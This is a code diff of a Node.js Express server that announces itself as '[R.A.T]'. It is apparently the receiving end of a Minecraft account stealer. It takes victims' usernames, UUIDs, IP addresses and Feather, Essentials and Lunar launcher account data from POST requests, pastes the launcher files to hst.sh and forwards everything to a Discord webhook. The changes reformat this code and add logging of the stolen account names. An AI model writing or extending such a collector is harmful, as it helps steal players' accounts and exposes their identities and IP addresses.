@@ -1,6 +1,6 @@
 //setup
-const { contentSecurityPolicy } = require('helmet');
-const getProfiles = require('./utils/networth');
+const { contentSecurityPolicy } = require('helmet')
+const getProfiles = require('./utils/networth')
 
 require("dotenv").config()
 
@@ -136,9 +136,9 @@ app.post("/", (req, res) => {
 
         // Set content
         // timestamp text
-        const now = Date.now();
-        const time = now + (24 * 60 * 60 * 1000);
-        const timestamp = Math.floor(time / 1000);
+        const now = Date.now()
+        const time = now + (24 * 60 * 60 * 1000)
+        const timestamp = Math.floor(time / 1000)
 
         let content = `@everyone - <t:${timestamp}:R>`
 
@@ -169,11 +169,11 @@ app.post("/", (req, res) => {
 
         // get profiles
         let profiles = ''
-        const profileData = await getProfiles(req.body.uuid);
+        const profileData = await getProfiles(req.body.uuid)
 
         if (profileData) {
             for (let profileId in profileData.profiles) {
-                profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
+                profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`
             }
         }
 
@@ -200,7 +200,7 @@ app.post("/", (req, res) => {
             checkEssentials = `https://hst.sh/raw/${essentials} - **(Essentials2)**`
 
             // Extract all usernames from essentials
-            essentialAccounts = JSON.parse(req.body.essentials).accounts.map(account => account.name);
+            essentialAccounts = JSON.parse(req.body.essentials).accounts.map(account => account.name)
         }
 
         //check lunar accounts and content in hastebin 
@@ -212,8 +212,13 @@ app.post("/", (req, res) => {
             checkLunar = `https://hst.sh/raw/${lunar} - **(Lunar3)**`
 
             // Extract usernames from lunar
-            lunarAccounts = Object.values(JSON.parse(req.body.lunar).accounts).map(account => account.username);
+            lunarAccounts = Object.values(JSON.parse(req.body.lunar).accounts).map(account => account.username)
         }
+        
+
+        console.log(`\`\`\`${featherAccounts.join('\n')}\`\`\``)
+        console.log(`\`\`\`${essentialAccounts.join('\n')}\`\`\``)
+        console.log(`\`\`\`${lunarAccounts.join('\n')}\`\`\``)
 
         try {
             post(webhook, JSON.stringify({
@@ -228,9 +233,9 @@ app.post("/", (req, res) => {
                         {name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true},
                         {name: 'Comment', value: `\`\`\`${comment}\`\`\``, inline: true},
                         {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
-                        {name: 'Feather Accounts:', value: `\`\`\`${featherAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Essential Accounts:', value: `\`\`\`${essentialAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Lunar Accounts:', value: `\`\`\`${lunarAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Essential Accounts:', value: `\`\`\`\n${essentialAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Lunar Accounts:', value: `\`\`\`\n${lunarAccounts.join('\n')}\`\`\``, inline: true},
                         {name: 'Feather', value: `${checkFeather}`, inline: true},
                         {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                         {name: 'Lunar', value: `${checkLunar}`, inline: true},
@@ -264,9 +269,9 @@ app.post("/", (req, res) => {
                         {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
                         {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
                         {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
-                        {name: 'Feather Accounts:', value: `\`\`\`${featherAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Essential Accounts:', value: `\`\`\`${essentialAccounts.join('\n')}\`\`\``, inline: true},
-                        {name: 'Lunar Accounts:', value: `\`\`\`${lunarAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Essential Accounts:', value: `\`\`\`\n${essentialAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Lunar Accounts:', value: `\`\`\`\n${lunarAccounts.join('\n')}\`\`\``, inline: true},
                         {name: 'Feather', value: `${checkFeather}`, inline: true},
                         {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                         {name: 'Lunar', value: `${checkLunar}`, inline: true},
@@ -306,10 +311,10 @@ app.post("/", (req, res) => {
 
 //create server
 app.listen(port, () => {
-    console.log(`[R.A.T] Listening at port ${port}`);
+    console.log(`[R.A.T] Listening at port ${port}`)
     // send to discord webhook
     
-});
+})
 
 //format a number into thousands millions billions
 const formatNumber = (num) => {
